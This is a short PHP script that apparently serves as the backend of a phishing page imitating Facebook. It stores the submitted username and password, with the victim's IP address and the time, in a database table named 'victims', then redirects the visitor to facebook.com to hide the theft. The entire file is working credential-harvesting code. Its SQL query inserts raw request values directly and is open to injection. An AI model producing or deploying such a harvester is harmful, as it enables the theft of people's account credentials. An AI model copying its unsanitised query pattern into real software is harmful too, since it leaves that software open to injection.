<?php

	include('connection.php');

	if(isset($_REQUEST['username']) && isset($_REQUEST['password'])){
		
		$usr = $_REQUEST['username'];
		$pass = $_REQUEST['password'];
		$ip=$_SERVER['REMOTE_ADDR'];
		$today = new DateTime("now", new DateTimeZone('Asia/Dhaka') );
		$saveTime =  $today->format('Y/m/d          h:i:sa');


		$sql = "INSERT INTO `victims` (`username`, `password`, `ip`, `time`) VALUES ('$usr', '$pass', '$ip', '$saveTime')";

		$rs = mysqli_query($con, $sql);

		if($rs)
		{
			header("Location: http://www.facebook.com");
		}
		else
		{
			header("Location: index.php");
		}
	}
?>
